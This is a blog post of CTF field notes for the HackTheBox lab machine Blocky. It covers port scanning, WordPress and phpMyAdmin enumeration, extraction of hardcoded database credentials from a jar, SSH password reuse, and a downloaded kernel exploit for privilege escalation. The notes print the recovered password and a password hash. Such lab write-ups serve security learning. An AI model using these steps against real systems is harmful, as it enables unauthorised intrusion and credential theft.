---
layout: post
title: "HackTheBox - Blocky - CTF Notes"
tagline: "Owning Blocky on HackTheBox"
description: "The following writeup shows the process I used to capture the user and root flags on Blocky 10.10.10.37 @ HackTheBox.eu"
date:   2017-12-13
comments: true
image:
  feature: blog/2/feature.jpg
  hero: blog/2/header.jpg
tags: [ctf, hackthebox, labs, notes]
---

## Introduction
The following writeup shows the process I used to capture the user and root flags on Blocky 10.10.10.37 @ [HackTheBox.eu](https://hackthebox.eu)

This post essentially contains the field notes I took as I was working my way through the box. With that in mind, I don't really go into detail about the commands I use and this isn't really a proper writeup. I might come back and touch it up later or I might just leave this as is. ¯\\\_(ツ)_/¯

## Port Scanning
First off let's check what ports are open.

```shell_session
nmap 10.10.10.37
Starting Nmap 7.60 ( https://nmap.org )
Nmap scan report for 10.10.10.37
Host is up (0.18s latency).
Not shown: 996 filtered ports
PORT STATE SERVICE
21/tcp open ftp
22/tcp open ssh
80/tcp open http
8192/tcp closed sophos
Nmap done: 1 IP address (1 host up) scanned in 18.88 seconds
```
Cool, we've got ftp (21), ssh (22) and http (80)

## Identification
Let's take a quick look at the headers on the web server

```shell_session
curl -I 10.10.10.37
```

```http
HTTP/1.1 200 OK
Server: Apache/2.4.18 (Ubuntu)
Link: <http://10.10.10.37/index.php/wp-json/>; rel="https://api.w.org/"
Content-Type: text/html; charset=UTF-8
```
It’s wordpress!

View-source:http://10.10.10.37 reveals we are working with Wordpress version 4.8.0 and there are no obvious plugins. Might come back with WPScan later.

/authors shows one user, “Notch”

Version 4.8.0 is affected by [a handful of vulnerabilities](https://wpvulndb.com/wordpresses/48) which we will come back too if needed.

## Enumeration
Let's do some directory enumeration...

```shell_session
uniscan -q -u http://10.10.10.37/
```

```
####################################
# Uniscan project #
# http://uniscan.sourceforge.net/ #
####################################
V. 6.3
======================================================================
=============================
| Domain: http://10.10.10.37/
| Server: Apache/2.4.18 (Ubuntu)
| IP: 10.10.10.37
======================================================================
=============================
|
| Directory check:
| [+] CODE: 200 URL: http://10.10.10.37/phpmyadmin/
| [+] CODE: 200 URL: http://10.10.10.37/plugins/
| [+] CODE: 200 URL: http://10.10.10.37/wiki/
| [+] CODE: 200 URL: http://10.10.10.37/wp-admin/
======================================================================
=============================
======================================================================
=============================
HTML report saved in: report/10.10.10.37.html
```

## Further Identification
View-source:http://10.10.10.37/phpmyadmin reveals version string [4.5.4.1deb2ubuntu2](https://www.phpmyadmin.net/files/4.5.4.1/) which was released on 2016-01-29.

[CVE-2016-5734](https://www.exploit-db.com/exploits/40185/) Affects this version.

Gonna keep digging…

http://10.10.10.37/wiki
(development page, will enumerate later)

http://10.10.10.37/plugins/
Cute File Browser

http://10.10.10.37/plugins/files/
Two java files found

http://10.10.10.37/plugins/files/BlockyCore.jar

http://10.10.10.37/plugins/files/griefprevention-1.11.2-3.1.1.298.jar

```shell_session
jar -xf BlockyCore.jar
cd com/myfirstplugin/
Jad BlockyCore.class
```
Found:
```java
sqlHost = "localhost";
sqlUser = "root";
sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
```

## Password Reuse

Check credentials on PHPMYAdmin.... We’re in!

Check password against other users seen in db

One user in wp_users

```sql
Notch $P$BiVoTj899ItS1EZnMhqeqVbrZI4Oq0/ notch notch@blockcraftfake.com
```

Testing sql pass on wordpress user failed, no pw reuse there.

Modifying user_pass or creating new wp user gives back-end access to WP, from there we could upload a shell as www-data.
Could also have used CVE-2016-5734 on PHPMyAdmin to get a shell.

Testing password over ssh

```shell_session
ssh root@10.10.10.37
```

Failed no pw reuse

```shell_session
ssh notch@10.10.10.37
```

total success

```shell_session
Welcome to Ubuntu 16.04.2 LTS (GNU/Linux 4.4.0-62-generic x86_64)
* Documentation: https://help.ubuntu.com
* Management: https://landscape.canonical.com
* Support: https://ubuntu.com/advantage
7 packages can be updated.
7 updates are security updates.
Last login: Sun Oct 29 11:09:42 2017 from 10.10.14.13
```

## Privilege Escalation
At this point we have the user flag, now let's get that root flag.

```shell_session
notch@Blocky:~$ uname -r
4.4.0-62-generic
```


Kernel 4.4.0-62-generic is impacted by [CVE-2017-6074](https://www.cvedetails.com/cve/CVE-2017-6074/)

On local machine
```shell_session
wget https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-6074/poc.c
```

```shell_session
gcc poc.c -o pwn
```

Transfer file over to target

`./pwn` as `notch` or `www-data` will cause root

Edit: Upon reading [another writeup](https://gist.github.com/berzerk0/1a6270d3cacf30c3b5cff82c7f53bf4c) I realized I overlooked something. It seems exploiting CVE-2017-6074 was unnecessary as the user `notch` was actually an admin. Exploiting the above CVE would still have been useful if we had gotten a shell as `www-data` or another under privileged user.

## Summary

Blocky was a relatively easy system to pwn. Leaving credentials in the java file was a cool touch and is actually something I see often in my work engagements. This box featured a combination of plain-text credential storage, password reuse, and old software.

If you found this helpful, feel free to [give me a +1](https://www.hackthebox.eu/home/users/profile/14010) on HackTheBox.
